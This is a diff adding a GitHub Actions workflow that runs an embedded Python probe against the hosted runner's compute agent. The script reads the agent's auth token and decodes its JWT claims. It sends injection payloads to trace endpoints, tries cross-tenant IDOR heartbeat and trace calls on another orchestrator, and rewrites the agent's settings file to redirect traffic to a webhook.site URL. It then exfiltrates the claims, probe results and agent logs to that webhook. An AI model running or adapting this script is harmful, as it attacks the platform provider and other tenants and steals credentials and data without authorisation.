@@ -1,0 +1,283 @@
+name: Probe v58 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    env:
+      V58_SOURCE: v58_account_a
+      V58_CROSS_SCHED: https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com
+      V58_CROSS_ALLOC: 5c7d0626-d71c-4030-b9d2-a83fbbc12b3c
+    steps:
+      - name: v58 trace-injection + cross-orch-idor + settings-redirect + docker
+        run: |
+          cat > /tmp/v58_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time, copy
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9cdd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V58_SOURCE", "v58_a")
+          CROSS_SCHED = os.environ.get("V58_CROSS_SCHED", "")
+          CROSS_ALLOC = os.environ.get("V58_CROSS_ALLOC", "")
+          
+          def probe(method, url, body=None, extra=None, timeout=15):
+              data = body if isinstance(body, bytes) else (body.encode() if isinstance(body, str) else None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=timeout)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace")}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace")}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex)}
+          
+          def auth(method, url, token, body=None):
+              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
+          
+          def sh(cmd, timeout=15):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return (r.stdout + r.stderr)[:3000]
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token       = s["authToken"]
+          sched_url   = s["schedulerApiUrl"].rstrip("/")
+          watchdog_url= s["watchdogTraceApiUrl"].rstrip("/")
+          trace_url   = s["traceApiUrl"].rstrip("/")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid","")
+          allocation_id = wid.split(":")[1].strip("{}") if ":" in wid else ""
+          
+          from urllib.parse import urlparse
+          sched_host = f"{urlparse(sched_url).scheme}://{urlparse(sched_url).netloc}"
+          
+          print(f"[{SOURCE}] alloc={allocation_id}")
+          print(f"[{SOURCE}] sched={sched_url}")
+          print(f"[{SOURCE}] watchdog={watchdog_url}")
+          print(f"[{SOURCE}] cross_sched={CROSS_SCHED} cross_alloc={CROSS_ALLOC}")
+          
+          results = {}
+          
+          # ===== 1. TRACE INJECTION — array payloads =================================
+          print(f"\n[{SOURCE}] === TRACE INJECTION (ARRAY PAYLOADS) ===")
+          
+          # OnVmLog (watchdog) - enumerate fields via progressive decode errors
+          watchdog_payloads = [
+              ("arr_empty",    "[]"),
+              ("arr_empty_obj","[{}]"),
+              ("arr_level",    '[{"level":"INFO"}]'),
+              ("arr_msg_level",'[{"message":"test","level":"INFO"}]'),
+              ("arr_vm_msg",   '[{"vmName":"test","message":"test","level":"INFO"}]'),
+              ("arr_ts_msg",   '[{"timestamp":1782262552,"message":"test","level":"INFO"}]'),
+              ("arr_alloc_msg",'[{"allocationId":"test","message":"test","level":"INFO"}]'),
+              ("arr_full",     '[{"level":"INFO","message":"test","vmName":"test","allocationId":"test","timestamp":1782262552,"source":"hca"}]'),
+              ("arr_log",      '[{"log":"test","stream":"stdout","time":"2026-06-24T00:00:00Z"}]'),
+              ("arr_severity", '[{"severity":"INFO","textPayload":"test","timestamp":"2026-06-24T00:00:00Z"}]'),
+              ("arr_two",      '[{"level":"INFO","message":"test1"},{"level":"WARN","message":"test2"}]'),
+              ("arr_nested",   '[{"level":"INFO","message":"test","metadata":{"key":"val"}}]'),
+          ]
+          
+          # HostedComputeAgentLog (request-orch) — different type, different fields
+          orch_payloads = [
+              ("oarr_empty",      "[]"),
+              ("oarr_empty_obj",  "[{}]"),
+              ("oarr_level",      '[{"level":"INFO"}]'),
+              ("oarr_msg_level",  '[{"message":"test","level":"INFO"}]'),
+              ("oarr_alloc",      '[{"allocationId":"test","message":"test","level":"INFO"}]'),
+              ("oarr_agent",      '[{"agentId":"test","message":"test","level":"INFO"}]'),
+              ("oarr_hca",        '[{"hcaVersion":"1.0","message":"test","level":"INFO","allocationId":"test"}]'),
+              ("oarr_ts",         '[{"timestamp":1782262552,"message":"test","level":"INFO","allocationId":"test"}]'),
+              ("oarr_full",       '[{"level":"INFO","message":"test","allocationId":"test","agentId":"test","timestamp":1782262552,"hcaVersion":"1.0"}]'),
+              ("oarr_runner",     '[{"runnerName":"test","message":"test","level":"INFO","allocationId":"test"}]'),
+          ]
+          
+          trace_injection_results = {}
+          for key, payload in watchdog_payloads:
+              r = auth("POST", watchdog_url, token, payload)
+              trace_injection_results[f"watchdog_{key}"] = {"status": r["status"], "body": r["body"][:1000]}
+              print(f"[TRACE_INJ] watchdog/{key} -> {r['status']} | {r['body'][:300]}")
+          
+          for key, payload in orch_payloads:
+              r = auth("POST", trace_url, token, payload)
+              trace_injection_results[f"orch_{key}"] = {"status": r["status"], "body": r["body"][:1000]}
+              print(f"[TRACE_INJ] orch/{key} -> {r['status']} | {r['body'][:300]}")
+          
+          results["trace_injection"] = trace_injection_results
+          
+          # ===== 2. CROSS-ORCHESTRATOR IDOR ==========================================
+          print(f"\n[{SOURCE}] === CROSS-ORCHESTRATOR IDOR ===")
+          cross_results = {}
+          
+          if CROSS_SCHED and CROSS_ALLOC:
+              cross_hb_url = f"{CROSS_SCHED}/v1/request/heartbeat"
+          
+              # Test 1: Own token → cross orchestrator → cross alloc (full cross-tenant)
+              r_cross = auth("PUT", cross_hb_url, token, json.dumps({"allocationId": CROSS_ALLOC}))
+              print(f"[CROSS_IDOR] own_token → other_orch → other_alloc -> {r_cross['status']} | {r_cross['body'][:300]}")
+              cross_results["cross_orch_other_alloc"] = {"status": r_cross["status"], "body": r_cross["body"][:500]}
+          
+              # Test 2: Own token → cross orchestrator → OWN alloc
+              r_cross_own = auth("PUT", cross_hb_url, token, json.dumps({"allocationId": allocation_id}))
+              print(f"[CROSS_IDOR] own_token → other_orch → own_alloc -> {r_cross_own['status']} | {r_cross_own['body'][:300]}")
+              cross_results["cross_orch_own_alloc"] = {"status": r_cross_own["status"], "body": r_cross_own["body"][:500]}
+          
+              # Test 3: Own token → cross orchestrator → GET /v1/request
+              r_cross_get = auth("GET", f"{CROSS_SCHED}/v1/request", token)
+              print(f"[CROSS_IDOR] own_token → other_orch → GET /request -> {r_cross_get['status']} | {r_cross_get['body'][:300]}")
+              cross_results["cross_orch_get"] = {"status": r_cross_get["status"], "body": r_cross_get["body"][:500]}
+          
+              # Test 4: Own token → cross orchestrator → POST /v1/trace (with cross alloc)
+              cross_trace_url = f"{CROSS_SCHED}/v1/trace"
+              r_cross_trace = auth("POST", cross_trace_url, token,
+                                   json.dumps([{"allocationId": CROSS_ALLOC, "message": "test", "level": "INFO"}]))
+              print(f"[CROSS_IDOR] own_token → other_orch/trace -> {r_cross_trace['status']} | {r_cross_trace['body'][:300]}")
+              cross_results["cross_orch_trace"] = {"status": r_cross_trace["status"], "body": r_cross_trace["body"][:500]}
+          
+          else:
+              print(f"[CROSS_IDOR] no CROSS_SCHED/CROSS_ALLOC set, testing same-orch cross-alloc only")
+          
+          # Same-orch with cross-alloc (replicate v57 with LIVE alloc if possible)
+          if CROSS_ALLOC:
+              r_same_orch_cross = auth("PUT", f"{sched_url}/request/heartbeat", token,
+                                        json.dumps({"allocationId": CROSS_ALLOC}))
+              print(f"[CROSS_IDOR] own_token → own_orch → other_alloc -> {r_same_orch_cross['status']} | {r_same_orch_cross['body'][:200]}")
+              cross_results["same_orch_cross_alloc"] = {"status": r_same_orch_cross["status"], "body": r_same_orch_cross["body"][:500]}
+          
+          results["cross_idor"] = cross_results
+          
+          # ===== 3. .SETTINGS REDIRECT (90s wait + activity trigger) ==================
+          print(f"\n[{SOURCE}] === .SETTINGS REDIRECT 90s ===")
+          SETTINGS_PATH = "/opt/hca/.settings"
+          try:
+              with open(SETTINGS_PATH) as f:
+                  orig_str = f.read()
+              orig = json.loads(orig_str)
+          
+              modified = copy.deepcopy(orig)
+              modified["watchdogTraceApiUrl"] = WEBHOOK
+              modified["traceApiUrl"] = WEBHOOK
+          
+              with open(SETTINGS_PATH, "w") as f:
+                  json.dump(modified, f)
+              print(f"[SETTINGS_REDIRECT] written: traceApiUrl → webhook")
+          
+              # Verify
+              with open(SETTINGS_PATH) as f:
+                  v = json.load(f)
+              ok = v.get("watchdogTraceApiUrl") == WEBHOOK
+              print(f"[SETTINGS_REDIRECT] verify ok={ok}")
+              results["settings_redirect_ok"] = ok
+          
+              # Activity to trigger HCA trace sends:
+              # 1. Download something (HCA monitors network activity)
+              sh("curl -sS --max-time 5 https://github.com > /dev/null 2>&1")
+              # 2. Simulate runner activity (HCA watches the runner process)
+              sh("ls /home/runner/work/ 2>&1; cat /proc/uptime; free -m")
+              # 3. Hit the trace endpoint directly (HCA might respond to the 400 by re-sending)
+              auth("POST", WEBHOOK, token, json.dumps([{"level":"INFO","message":"settings-redirect-active"}]))
+          
+              print(f"[SETTINGS_REDIRECT] waiting 90s...")
+              time.sleep(90)
+          
+              with open(SETTINGS_PATH, "w") as f:
+                  f.write(orig_str)
+              print(f"[SETTINGS_REDIRECT] restored")
+          
+          except Exception as ex:
+              print(f"[SETTINGS_REDIRECT] error: {ex}")
+              try:
+                  with open(SETTINGS_PATH, "w") as f:
+                      f.write(orig_str)
+                  print(f"[SETTINGS_REDIRECT] restored after error")
+              except:
+                  pass
+          
+          # ===== 4. DOCKER GROUP CHECK ================================================
+          print(f"\n[{SOURCE}] === DOCKER GROUP CHECK ===")
+          docker_results = {}
+          docker_group = sh("id runner 2>&1; groups runner 2>&1")
+          print(f"[DOCKER] groups: {docker_group}")
+          docker_results["groups"] = docker_group
+          
+          docker_ps = sh("docker ps 2>&1 | head -10", timeout=10)
+          print(f"[DOCKER] docker ps: {docker_ps[:300]}")
+          docker_results["docker_ps"] = docker_ps
+          
+          docker_info = sh("docker info 2>&1 | head -20", timeout=10)
+          print(f"[DOCKER] docker info: {docker_info[:500]}")
+          docker_results["docker_info"] = docker_info
+          
+          # Can we list containers or images?
+          docker_imgs = sh("docker images 2>&1 | head -10", timeout=10)
+          print(f"[DOCKER] images: {docker_imgs[:300]}")
+          docker_results["docker_images"] = docker_imgs
+          
+          # docker sock perms
+          sock_perms = sh("ls -la /var/run/docker.sock; stat /var/run/docker.sock 2>&1")
+          print(f"[DOCKER] sock perms: {sock_perms[:300]}")
+          docker_results["sock_perms"] = sock_perms
+          
+          results["docker"] = docker_results
+          
+          # ===== 5. OnVmLog / HostedComputeAgentLog field enumeration via binary =====
+          print(f"\n[{SOURCE}] === BINARY FIELD ENUMERATION ===")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          
+          # Focus on OnVmLog and HostedComputeAgentLog struct JSON tags
+          on_vm_log = sh(f'strings {bin_path} 2>/dev/null | grep -iE "(OnVmLog|HostedComputeAgentLog|onvmlog|agentlog)" | sort -u | head -40', timeout=15)
+          print(f"[BIN_TYPES] OnVmLog/AgentLog refs:\n{on_vm_log}")
+          
+          # Look for json struct tags adjacent to these types
+          all_json_tags = sh(f'strings {bin_path} 2>/dev/null | grep -E "^json:" | sort -u | head -100', timeout=15)
+          print(f"[BIN_JSON] all json: tags:\n{all_json_tags[:3000]}")
+          
+          # Look for field names that appear adjacent to the type names in .rodata
+          rodata_onvmlog = sh(f'readelf -p .rodata {bin_path} 2>/dev/null | grep -B2 -A2 -i "OnVmLog\\|AgentLog" | head -60', timeout=30)
+          print(f"[BIN_RODATA] OnVmLog in .rodata:\n{rodata_onvmlog[:3000]}")
+          
+          results["binary_fields"] = {
+              "on_vm_log_refs": on_vm_log[:3000],
+              "all_json_tags": all_json_tags[:5000],
+              "rodata_onvmlog": rodata_onvmlog[:3000],
+          }
+          
+          # ===== 6. HCA log contents — what does HCA actually log? ===================
+          print(f"\n[{SOURCE}] === HCA LOG CONTENT ===")
+          hca_log = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null", timeout=10)
+          print(f"[HCA_LOG] {len(hca_log)} chars:\n{hca_log[:5000]}")
+          results["hca_log"] = hca_log[:15000]
+          
+          # ===== 7. Webhook ==========================================================
+          print(f"\n[{SOURCE}] sending webhook...")
+          data = json.dumps({"source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+                             "allocation_id": allocation_id, "claims": claims,
+                             "results": results}, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v58_probe.py
+      - name: Keep alive
+        run: sleep 30
